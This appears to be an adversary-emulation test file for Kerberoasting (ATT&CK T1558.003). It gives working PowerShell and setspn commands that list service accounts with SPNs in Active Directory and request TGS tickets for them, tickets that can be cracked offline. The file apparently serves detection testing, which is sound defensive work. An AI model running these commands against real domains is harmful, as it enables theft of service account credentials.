attack_technique: T1558.003
display_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
tactic: Credential Access
atomic_tests:
  - name: "SPN Enumeration for Kerberoasting"
    auto_generated_guid: b2b2c2d2e2f2a3b3c3d3e3f3a4b4c4d4
    description: |
      Enumerates Service Principal Names (SPNs) for Kerberoastable accounts.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        $searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
        $searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","pwdlastset","memberof"))
        $results = $searcher.FindAll()
        Write-Output "Kerberoastable accounts: $($results.Count)"
        foreach ($r in $results) { Write-Output "  $($r.Properties['samaccountname']) - SPN: $($r.Properties['serviceprincipalname'] -join ', ')" }
      elevation_required: false

  - name: "Kerberoasting via setspn.exe"
    auto_generated_guid: c3c3d3e3f3a4b4c4d4e4f4a5b5c5d5e5
    description: |
      Uses built-in setspn.exe to enumerate SPNs.
    supported_platforms:
      - windows
    executor:
      name: command_prompt
      command: |
        setspn -Q */*
      elevation_required: false

  - name: "Request TGS Tickets for Kerberoasting"
    auto_generated_guid: d4d4e4f4a5b5c5d5e5f5a6b6c6d6e6f6
    description: |
      Requests TGS tickets for SPNs using .NET Kerberos API.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        Add-Type -AssemblyName System.IdentityModel
        $searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
        $results = $searcher.FindAll()
        foreach ($r in $results) {
          $spn = ($r.Properties['serviceprincipalname'])[0]
          try { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; Write-Output "TGS requested for: $spn" }
          catch { Write-Output "Failed to request TGS for: $spn - $($_.Exception.Message)" }
        }
      elevation_required: false
